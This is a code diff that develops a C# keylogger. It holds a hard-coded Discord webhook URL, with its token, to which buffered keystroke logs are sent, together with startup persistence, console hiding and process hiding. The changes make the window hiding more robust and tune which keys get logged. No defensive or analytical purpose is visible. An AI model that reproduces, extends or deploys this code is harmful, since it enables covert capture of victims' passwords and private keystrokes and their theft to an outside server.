@@ -13,8 +13,6 @@ class KeyLogger
 {
     // Webhook configuration
     private static string webhookUrl = "https://discord.com/api/webhooks/1460302846003253280/J9JQZi-f-1eQ9Hv1JU1vHEHlp2KWvLCRMOLLopMTJ6wnZ5OXm3Je3lnxyDNh8oQDdyfd";
-
-    // Logging buffer and state
     private static StringBuilder logBuffer = new StringBuilder();
     private static readonly object bufferLock = new object();
     private static bool isLogging = false;
@@ -43,12 +41,11 @@ class KeyLogger
         return true;
     }
 
-    // Process hiding
-    [DllImport("user32.dll")]
-    private static extern bool ShowWindow(IntPtr hWnd, int nCmd);
-
     [DllImport("kernel32.dll")]
-    private static extern IntPtr GetConsoleWindow();
+    static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
     // Key state detection
     [DllImport("user32.dll")]
@@ -56,6 +53,7 @@ class KeyLogger
 
     // Windows API constants
     private const int SW_HIDE = 0;
+    private const int SW_SHOW = 5;
     private const int VK_SHIFT = 160;
     private const int VK_CONTROL = 162;
     private const int VK_ALT = 164;
@@ -121,8 +119,7 @@ class KeyLogger
             // Add to startup
             AddToStartup();
 
-            // Hide console window
-            HideConsole();
+            HideConsoleWindow();
 
             // Start logging
             StartLogging();
@@ -137,9 +134,7 @@ class KeyLogger
 
             SetupProcessHiding();
 
-            Thread monitorThread = new Thread(MonitorForDetection);
-            monitorThread.IsBackground = true;
-            monitorThread.Start();
+            Thread.Sleep(Timeout.Infinite);
 
             // Keep the application running
             while (isRunning)
@@ -168,14 +163,20 @@ class KeyLogger
         logTimer = new Timer(SendBufferedLogs, null, LogInterval, LogInterval);
     }
 
-    private static void HideConsole()
+    private static void HideConsoleWindow()
     {
         try
         {
-            var handle = GetConsoleWindow();
-            ShowWindow(handle, SW_HIDE);
+            IntPtr consoleWindow = GetConsoleWindow();
+            if (consoleWindow != IntPtr.Zero)
+            {
+                ShowWindow(consoleWindow, SW_HIDE);
+            }
         }
-        catch { /* Silent failure */ }
+        catch (Exception ex)
+        {
+            LogToFile($"Failed to hide console window: {ex.Message}");
+        }
     }
 
     private static void AddToStartup()
@@ -351,6 +352,12 @@ class KeyLogger
 
     private static bool ShouldLogKey(int vkCode)
     {
+        // Skip mouse buttons (VK_LBUTTON=1, VK_RBUTTON=2, VK_MBUTTON=4)
+        if (vkCode == 1 || vkCode == 2 || vkCode == 4)
+        {
+            return false;
+        }
+
         // Skip certain keys that might be noise
         if (vkCode == 160 || vkCode == 161 || vkCode == 162 || vkCode == 163 || vkCode == 164 || vkCode == 165)
         {
